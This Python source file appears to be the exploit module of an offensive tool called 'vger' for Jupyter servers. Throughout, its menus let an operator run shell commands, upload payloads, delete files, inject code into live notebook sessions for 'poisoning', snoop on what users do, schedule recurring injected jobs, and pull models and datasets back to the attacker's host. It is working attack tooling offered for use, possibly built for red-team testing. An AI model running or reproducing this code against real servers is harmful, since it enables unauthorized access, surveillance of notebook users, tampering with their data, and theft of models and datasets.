import inquirer
import asyncio
from vger.attack import Attack
import json
import base64
import multiprocessing as mp
from vger.connection import DumbConnection, Connection


class Exploit:
    def __init__(self, host_or_connection, secret=None):
        if isinstance(host_or_connection, DumbConnection):
            self.connection = host_or_connection
        else:
            self.connection = Connection(host_or_connection, secret)

    def exploit(self):
        if self.connection.first_time_in_menu["exploit"]:
            self.connection.first_time_in_menu["exploit"] = False
            self.connection.print_with_rule(
                """
                Expand your access into the jupyter server and start interacting with notebooks.
                [bold red]Run shell commands[/bold red] to change server state.
                [bold red]Upload[/bold red] and [bold red]Delete[/bold red] files to exfiltrate valuable artifacts or upload payloads.
                [bold red]Attack running notebooks[/bold red] to inject code or Attack(self.connection).snoop on sessions.
                [bold red]Download models[/bold red] and [bold red]datasets[/bold red] to your local host.
                """,
                category="Exploit",
            )
        exploit_menu = [
            inquirer.List(
                "option",
                "How would you like to exploit?",
                choices=[
                    "Run shell command",
                    "Upload file",
                    "Delete file",
                    "Attack running notebook",
                    "Download models",
                    "Download datasets",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(exploit_menu)
        match answer["option"]:
            case "Run shell command":
                self.run_in_shell()
                self.exploit()
            case "Upload file":
                self.upload()
                self.exploit()
            case "Delete file":
                self.delete()
                self.exploit()
            case "Attack running notebook":
                session_count = self.pick_target()
                if session_count:
                    self.exploit_attack()
                else:
                    self.connection.print_with_rule("Returning to exploit menu")
                    self.exploit()
            case "Download models":
                self.download_files(self.connection.model_paths)
                self.exploit()
            case "Download datasets":
                self.download_files(self.connection.datasets)
                self.exploit()
            case "Back to main menu":
                self.menu()

    def exploit_attack(self):
        if self.connection.first_time_in_menu["exploit_attack"]:
            self.connection.first_time_in_menu["exploit_attack"] = False
            self.connection.print_with_rule(
                """
                Focus on a specific notebook session.
                [bold red]Show history[/bold red] of commands run in the notebook.
                [bold red]List imported modules[/bold red] in the notebook. Useful for identifying what imports you have available.
                [bold red]Inject code[/bold red] into the notebook runtime (just as if the user ran it). Great for poisoning.
                [bold red]Snoop[/bold red] on the notebook session to see what the user is doing.
                [bold red]Start and kill recurring jobs[/bold red] to inject code on your schedule.
                """,
                category="Exploit Notebook",
            )
        attack_menu = [
            inquirer.List(
                "option",
                "Show history or inject code?",
                choices=[
                    "Show history",
                    "List imported modules",
                    "Inject code",
                    "Snoop",
                    "Recurring job",
                    "Kill job",
                    "Switch notebook",
                    "Back to main menu",
                ],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        match answer["option"]:
            case "Show history":
                self.dump_history()
                self.exploit_attack()
            case "List imported modules":
                self.list_modules()
                self.exploit_attack()
            case "Inject code":
                self.inject()
                self.exploit_attack()
            case "Switch notebook":
                self.switch_target_notebook()
                self.exploit_attack()
            case "Snoop":
                self.snoop_for()
                self.exploit_attack()
            case "Recurring job":
                self.stomp()
                self.exploit_attack()
            case "Kill job":
                if len(self.connection.jobs) > 0:
                    self.kill_job()
                else:
                    self.connection.print_with_rule("No running jobs to kill")
                self.exploit_attack()
            case "Back to main menu":
                self.menu()

    def inject(self):
        """
        Run code in the context of a notebook runtime. This can be used to overwrite existing variables or modify data.
        """
        attack_menu = [
            inquirer.List(
                name="payload",
                message="Would you like to use an editor for your payload or reference an existing .py file?",
                choices=["editor", ".py"],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        if answer["payload"] == "editor":
            payload_str = inquirer.editor("What code would you like to inject?")
        else:
            payload = [
                inquirer.Path(
                    name="path",
                    message="Where is the payload .py? ",
                    path_type=inquirer.Path.FILE,
                    exists=True,
                )
            ]
            answer = inquirer.prompt(payload)
            path = answer["path"].split("? ")[-1]
            with open(path, "r") as f:
                payload_str = f.read()
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            Attack(self.connection).attack_session(self.target, payload_str)
        )

    def dump_history(self):
        """
        Use IPython magic to see the notebook command history.
        """
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            Attack(self.connection).attack_session(
                self.target,
                "%history",
                silent=False,
                print_out=False,
            )
        )

    def switch_target_notebook(self):
        """
        Change target notebook for notebook-specific operations.
        """
        self.connection.list_running_jpy_sessions()
        self.pick_target()
        self.exploit_attack()

    def upload(self):
        """
        Upload file from local host to target host.
        """
        payload = [
            inquirer.Path(
                name="path",
                message="What file do you want to upload? ",
                path_type=inquirer.Path.FILE,
                exists=True,
            )
        ]
        answer = inquirer.prompt(payload)
        file_path = answer["path"].split("? ")[-1]
        with open(file_path, "rb") as f:
            payload = f.read()
            payload = base64.b64encode(payload).decode("utf-8")
        target = [
            inquirer.Text("path", "Where do you want to place the file?", default="/")
        ]
        answer = inquirer.prompt(target)
        data = {
            "content": payload,
            "format": "base64",
            "path": answer["path"],
            "type": "file",
        }
        self.connection.print_with_rule(
            self.connection.upload(answer["path"], json.dumps(data))
        )

    def delete(self):
        """
        Delete specific file.
        """
        target = [inquirer.Text("path", "What file do you want to delete?")]
        answer = inquirer.prompt(target)
        response = self.connection.delete(answer["path"])
        if response.status_code == 204:
            self.connection.print_with_rule(f"{answer["path"]} deleted successfully")
        else:
            self.connection.print_with_rule(f"Error deleting {answer["path"]}")

    def snoop_for(self):
        """
        Monitor notebook execution and output for specified time.
        """
        if not self.connection.target:
            self.connection.print_with_rule("You must select a target to snoop on")
            self.pick_target()
            self.snoop_for()
        else:
            answer = [
                inquirer.Text(
                    "seconds", "How many seconds would you like to snoop for?"
                )
            ]
            answer = inquirer.prompt(answer)
            try:
                int(answer["seconds"])
            except (ValueError, KeyboardInterrupt):
                self.connection.print_with_rule("Please specify a timeout in seconds")
                self.menu()
            loop = asyncio.get_event_loop()
            with self.connection.con.status("snooping..."):
                loop.run_until_complete(
                    Attack(self.connection).snoop(self.target, timeout=int(answer["seconds"]))
                )

    def stomp(self):
        answers = [
            inquirer.Text("job_name", "What do you want to name this job?"),
            inquirer.Editor(
                "objective", "What do you want to run on a recurring basis?"
            ),
            inquirer.Text(
                "sleep", "How many seconds do you want to sleep between runs?"
            ),
        ]
        answers = inquirer.prompt(answers)
        ctx = mp.get_context("spawn")
        x = DumbConnection(self.connection.url, self.connection.secret)
        x.list_running_jpy_sessions()
        try:
            p = ctx.Process(
                target=Attack(x).stomp,
                args=(self.target, answers["objective"], int(answers["sleep"])),
            )
        except:
            self.connection.print_with_rule("Invalid args")
            self.exploit_attack()
        self.connection.jobs[answers["job_name"]] = p
        p.start()

    def kill_job(self):
        answers = [
            inquirer.Checkbox(
                "jobs", "What job(s) do you want to kill?", choices=self.connection.jobs.keys()
            )
        ]
        answers = inquirer.prompt(answers)
        for job in answers["jobs"]:
            self.connection.jobs[job].kill()
            self.connection.print_with_rule(f"Killed {job}")

    def list_modules(self):
        payload_str = (
            "from types import ModuleType as MT;\n"
            + "[k for k, v in globals().items() if type(v) is MT and not k.startswith('__')]"
        )
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            Attack(self.connection).attack_session(
                self.connection.target, payload_str, silent=False, print_out=False
            )
        )
